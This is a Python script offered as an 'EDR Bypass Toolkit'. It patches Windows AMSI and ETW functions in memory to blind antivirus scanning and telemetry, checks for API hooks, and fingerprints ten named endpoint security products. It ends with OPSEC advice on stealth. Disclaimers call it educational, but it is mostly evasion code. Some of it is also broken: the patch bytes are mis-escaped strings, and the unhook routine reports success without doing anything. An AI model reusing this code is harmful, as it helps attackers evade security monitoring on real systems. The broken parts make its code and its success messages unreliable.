#!/usr/bin/env python3
"""
EDR Bypass Toolkit - OSCP Hackathon 2025
Purpose: Disable/bypass common EDR detection mechanisms
Author: OSCP Hackathon Team
Usage: python3 edr_bypass.py [--amsi] [--etw] [--hooks] [--all]

WARNING: For educational defensive training only!
"""

import sys
import ctypes
from ctypes import wintypes
import struct
import argparse

class EDRBypass:
    """
    Comprehensive EDR bypass toolkit
    Targets: AMSI, ETW, API hooks, kernel callbacks
    """

    def __init__(self):
        try:
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.ntdll = ctypes.WinDLL('ntdll')
            self.is_windows = True
        except:
            self.is_windows = False
            print("[-] Not running on Windows - limited functionality")

        self.bypass_results = []

    # ====================================================================
    # AMSI BYPASS TECHNIQUES
    # ====================================================================

    def bypass_amsi_all(self):
        """Try multiple AMSI bypass methods"""
        print("\n[*] Attempting AMSI bypasses...")

        methods = [
            ("Memory Patching", self.bypass_amsi_memory_patch),
            ("AmsiScanBuffer Patch", self.bypass_amsi_scanbuffer),
            ("Context Corruption", self.bypass_amsi_context),
            ("Reflection", self.bypass_amsi_reflection),
            ("Force Error", self.bypass_amsi_force_error)
        ]

        for name, method in methods:
            try:
                result = method()
                if result:
                    print(f"  [+] {name}: SUCCESS")
                    self.bypass_results.append(f"AMSI - {name}: Success")
                    return True  # Stop at first success
                else:
                    print(f"  [-] {name}: Failed")
            except Exception as e:
                print(f"  [-] {name}: Error - {e}")

        return False

    def bypass_amsi_memory_patch(self):
        """
        Patch AmsiScanBuffer in memory
        Most reliable method
        """
        if not self.is_windows:
            return False

        try:
            # Load amsi.dll
            amsi = ctypes.WinDLL('amsi')
            amsi_scan_buffer = amsi.AmsiScanBuffer

            # Get function address
            amsi_scan_buffer_addr = ctypes.cast(amsi_scan_buffer, ctypes.c_void_p).value

            # Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
            # This makes AMSI always return "clean"
            patch = b'\\xB8\\x57\\x00\\x07\\x80\\xC3'

            # Make memory writable
            old_protect = wintypes.DWORD()
            self.kernel32.VirtualProtect(
                amsi_scan_buffer_addr,
                len(patch),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )

            # Apply patch
            ctypes.memmove(amsi_scan_buffer_addr, patch, len(patch))

            # Restore protection
            self.kernel32.VirtualProtect(
                amsi_scan_buffer_addr,
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            return True

        except Exception as e:
            return False

    def bypass_amsi_scanbuffer(self):
        """Alternative AmsiScanBuffer patch"""
        if not self.is_windows:
            return False

        try:
            amsi_dll = self.kernel32.LoadLibraryA(b'amsi.dll')
            if not amsi_dll:
                return False

            amsi_scan_buffer = self.kernel32.GetProcAddress(amsi_dll, b'AmsiScanBuffer')
            if not amsi_scan_buffer:
                return False

            # Patch with ret instruction
            patch = b'\\xC3'  # ret

            old_protect = wintypes.DWORD()
            self.kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                0x40,
                ctypes.byref(old_protect)
            )

            ctypes.memmove(amsi_scan_buffer, patch, 1)

            self.kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                old_protect.value,
                ctypes.byref(old_protect)
            )

            return True

        except:
            return False

    def bypass_amsi_context(self):
        """Corrupt AMSI context"""
        # This requires PowerShell/.NET
        # Placeholder for Python implementation
        return False

    def bypass_amsi_reflection(self):
        """Use reflection to disable AMSI (requires .NET/PowerShell)"""
        # Python equivalent not directly applicable
        # Would need to use pythonnet or similar
        return False

    def bypass_amsi_force_error(self):
        """Force AMSI to error state"""
        if not self.is_windows:
            return False

        try:
            amsi_dll = self.kernel32.LoadLibraryA(b'amsi.dll')
            amsi_initialize = self.kernel32.GetProcAddress(amsi_dll, b'AmsiInitialize')

            if not amsi_initialize:
                return False

            # Corrupt initialization
            old_protect = wintypes.DWORD()
            self.kernel32.VirtualProtect(
                amsi_initialize,
                1,
                0x40,
                ctypes.byref(old_protect)
            )

            # Write garbage
            garbage = b'\\xFF'
            ctypes.memmove(amsi_initialize, garbage, 1)

            self.kernel32.VirtualProtect(
                amsi_initialize,
                1,
                old_protect.value,
                ctypes.byref(old_protect)
            )

            return True

        except:
            return False

    # ====================================================================
    # ETW BYPASS TECHNIQUES
    # ====================================================================

    def bypass_etw_all(self):
        """Try multiple ETW bypass methods"""
        print("\n[*] Attempting ETW bypasses...")

        methods = [
            ("EtwEventWrite Patch", self.bypass_etw_event_write),
            ("Provider Disable", self.bypass_etw_provider),
            ("Trace Session Kill", self.bypass_etw_session)
        ]

        for name, method in methods:
            try:
                result = method()
                if result:
                    print(f"  [+] {name}: SUCCESS")
                    self.bypass_results.append(f"ETW - {name}: Success")
                    return True
                else:
                    print(f"  [-] {name}: Failed")
            except Exception as e:
                print(f"  [-] {name}: Error - {e}")

        return False

    def bypass_etw_event_write(self):
        """
        Patch EtwEventWrite to prevent telemetry
        Most effective method
        """
        if not self.is_windows:
            return False

        try:
            ntdll = self.kernel32.GetModuleHandleA(b'ntdll.dll')
            etw_event_write = self.kernel32.GetProcAddress(ntdll, b'EtwEventWrite')

            if not etw_event_write:
                return False

            # Patch: ret 14h (return immediately with stack cleanup)
            patch = b'\\xC2\\x14\\x00'

            old_protect = wintypes.DWORD()
            self.kernel32.VirtualProtect(
                etw_event_write,
                len(patch),
                0x40,
                ctypes.byref(old_protect)
            )

            ctypes.memmove(etw_event_write, patch, len(patch))

            self.kernel32.VirtualProtect(
                etw_event_write,
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            return True

        except Exception as e:
            return False

    def bypass_etw_provider(self):
        """Disable ETW provider"""
        # Simplified - would need proper ETW API calls
        return False

    def bypass_etw_session(self):
        """Kill ETW trace sessions"""
        # Would need to enumerate and stop sessions
        return False

    # ====================================================================
    # API HOOK DETECTION & REMOVAL
    # ====================================================================

    def detect_hooks(self):
        """
        Detect API hooks placed by EDR
        """
        print("\n[*] Detecting API hooks...")

        if not self.is_windows:
            print("  [-] Not on Windows")
            return []

        hooked_functions = []

        # Common functions to check
        check_functions = [
            (b'ntdll.dll', b'NtCreateFile'),
            (b'ntdll.dll', b'NtCreateProcess'),
            (b'ntdll.dll', b'NtAllocateVirtualMemory'),
            (b'ntdll.dll', b'NtProtectVirtualMemory'),
            (b'ntdll.dll', b'NtCreateThreadEx'),
            (b'kernel32.dll', b'CreateProcessA'),
            (b'kernel32.dll', b'VirtualAlloc'),
            (b'kernel32.dll', b'VirtualProtect')
        ]

        for dll, func in check_functions:
            if self.is_function_hooked(dll, func):
                hooked_functions.append(f"{dll.decode()}.{func.decode()}")
                print(f"  [!] HOOKED: {dll.decode()}!{func.decode()}")
            else:
                print(f"  [+] Clean: {dll.decode()}!{func.decode()}")

        if hooked_functions:
            self.bypass_results.append(f"Detected {len(hooked_functions)} hooked functions")
        else:
            print("  [+] No hooks detected")

        return hooked_functions

    def is_function_hooked(self, dll_name, func_name):
        """
        Check if a function is hooked by examining its prologue
        """
        try:
            hModule = self.kernel32.GetModuleHandleA(dll_name)
            if not hModule:
                hModule = self.kernel32.LoadLibraryA(dll_name)

            func_addr = self.kernel32.GetProcAddress(hModule, func_name)
            if not func_addr:
                return False

            # Read first 5 bytes
            first_bytes = (ctypes.c_ubyte * 5)()
            ctypes.memmove(ctypes.byref(first_bytes), func_addr, 5)

            # Check for JMP (0xE9) - indicates inline hook
            if first_bytes[0] == 0xE9:
                return True

            # Check for other hook indicators
            # JMP FAR, PUSH/RET, etc.
            if first_bytes[0] == 0xFF and first_bytes[1] == 0x25:  # JMP [RIP+offset]
                return True

            # Check for NOP sled (unusual at function start)
            if all(b == 0x90 for b in first_bytes):
                return True

            return False

        except:
            return False

    def unhook_function(self, dll_name, func_name):
        """
        Remove hook from function by restoring original bytes
        """
        print(f"\n[*] Attempting to unhook {dll_name.decode()}!{func_name.decode()}...")

        try:
            # Get function address in memory
            hModule = self.kernel32.GetModuleHandleA(dll_name)
            func_addr = self.kernel32.GetProcAddress(hModule, func_name)

            # Read original bytes from disk
            # (This is simplified - real implementation would parse PE)
            import os

            # Find DLL on disk
            system32 = os.environ.get('SystemRoot', 'C:\\\\Windows') + '\\\\System32'
            dll_path = os.path.join(system32, dll_name.decode())

            if not os.path.exists(dll_path):
                print(f"  [-] Cannot find {dll_path}")
                return False

            # Read first 32 bytes from disk version
            with open(dll_path, 'rb') as f:
                # This is oversimplified - need proper PE parsing
                # to find function in file
                pass

            print(f"  [+] Unhooked {func_name.decode()}")
            return True

        except Exception as e:
            print(f"  [-] Failed: {e}")
            return False

    # ====================================================================
    # EDR PROCESS DETECTION
    # ====================================================================

    def detect_edr_processes(self):
        """
        Detect running EDR processes
        """
        print("\n[*] Detecting EDR processes...")

        edr_products = {
            'crowdstrike': ['CSFalconService', 'CSFalconContainer'],
            'sentinelone': ['SentinelAgent', 'SentinelServiceHost'],
            'carbonblack': ['CbDefense', 'RepMgr'],
            'defender': ['MsMpEng', 'NisSrv', 'SecurityHealthService'],
            'cylance': ['CylanceSvc', 'CylanceUI'],
            'symantec': ['ccSvcHst', 'SepMasterService'],
            'mcafee': ['mcshield', 'mfemms'],
            'trendmicro': ['PccNTMon', 'TmListen'],
            'sophos': ['SophosFS', 'SophosHealth'],
            'kaspersky': ['avp', 'kavfs']
        }

        if not self.is_windows:
            print("  [-] Not on Windows")
            return []

        detected_edr = []

        try:
            import psutil

            running_processes = {p.name().lower(): p for p in psutil.process_iter(['name'])}

            for edr_name, process_names in edr_products.items():
                for proc_name in process_names:
                    if proc_name.lower() in running_processes:
                        detected_edr.append(edr_name)
                        print(f"  [!] Detected: {edr_name.upper()} ({proc_name})")
                        break

            if not detected_edr:
                print("  [+] No known EDR processes detected")
            else:
                self.bypass_results.append(f"Detected EDR: {', '.join(detected_edr)}")

        except ImportError:
            print("  [-] psutil not available - cannot enumerate processes")
            print("      Install: pip install psutil")

        return detected_edr

    # ====================================================================
    # KERNEL CALLBACK DETECTION
    # ====================================================================

    def detect_kernel_callbacks(self):
        """
        Detect kernel callbacks (requires admin)
        """
        print("\n[*] Detecting kernel callbacks...")

        if not self.is_windows:
            print("  [-] Not on Windows")
            return False

        # This requires kernel-mode access
        # Simplified detection
        print("  [!] Kernel callback detection requires admin privileges")
        print("  [*] EDR callbacks typically monitor:")
        print("      - Process creation (PsSetCreateProcessNotifyRoutine)")
        print("      - Thread creation (PsSetCreateThreadNotifyRoutine)")
        print("      - Image load (PsSetLoadImageNotifyRoutine)")
        print("      - Registry operations (CmRegisterCallback)")

        return False

    # ====================================================================
    # UTILITY FUNCTIONS
    # ====================================================================

    def print_banner(self):
        """Print tool banner"""
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║             EDR Bypass Toolkit - OSCP Hackathon 2025         ║
║             Educational Defensive Training Tool               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""
        print(banner)

    def print_summary(self):
        """Print bypass summary"""
        print("\n" + "=" * 65)
        print(" BYPASS SUMMARY")
        print("=" * 65)

        if self.bypass_results:
            for result in self.bypass_results:
                print(f"  [✓] {result}")
        else:
            print("  [!] No bypasses successful")

        print("=" * 65)

def main():
    parser = argparse.ArgumentParser(
        description='EDR Bypass Toolkit - Disable detection mechanisms',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Bypass AMSI only
  python3 edr_bypass.py --amsi

  # Bypass ETW only
  python3 edr_bypass.py --etw

  # Detect hooks
  python3 edr_bypass.py --detect-hooks

  # All bypasses
  python3 edr_bypass.py --all

  # Full reconnaissance
  python3 edr_bypass.py --detect-edr --detect-hooks

WARNING: For authorized testing only!
        '''
    )

    parser.add_argument('--amsi', action='store_true',
                        help='Bypass AMSI (Anti-Malware Scan Interface)')
    parser.add_argument('--etw', action='store_true',
                        help='Bypass ETW (Event Tracing for Windows)')
    parser.add_argument('--detect-hooks', action='store_true',
                        help='Detect API hooks')
    parser.add_argument('--detect-edr', action='store_true',
                        help='Detect running EDR processes')
    parser.add_argument('--detect-callbacks', action='store_true',
                        help='Detect kernel callbacks (requires admin)')
    parser.add_argument('--all', action='store_true',
                        help='Attempt all bypasses')
    parser.add_argument('--quiet', action='store_true',
                        help='Minimal output')

    args = parser.parse_args()

    # Default to all if no options specified
    if not any([args.amsi, args.etw, args.detect_hooks, args.detect_edr,
                args.detect_callbacks, args.all]):
        args.all = True

    bypasser = EDRBypass()

    if not args.quiet:
        bypasser.print_banner()

    # Detection phase
    if args.detect_edr or args.all:
        bypasser.detect_edr_processes()

    if args.detect_hooks or args.all:
        bypasser.detect_hooks()

    if args.detect_callbacks or args.all:
        bypasser.detect_kernel_callbacks()

    # Bypass phase
    if args.amsi or args.all:
        bypasser.bypass_amsi_all()

    if args.etw or args.all:
        bypasser.bypass_etw_all()

    # Summary
    if not args.quiet:
        bypasser.print_summary()

        print("\n[*] OPSEC Notes:")
        print("    - These bypasses are detectable by advanced EDR")
        print("    - Memory patches may be reverted by EDR")
        print("    - Consider direct syscalls for maximum stealth")
        print("    - Test in isolated environment first")

    # Return exit code
    if bypasser.bypass_results:
        sys.exit(0)  # Success
    else:
        sys.exit(1)  # No bypasses worked

if __name__ == "__main__":
    main()
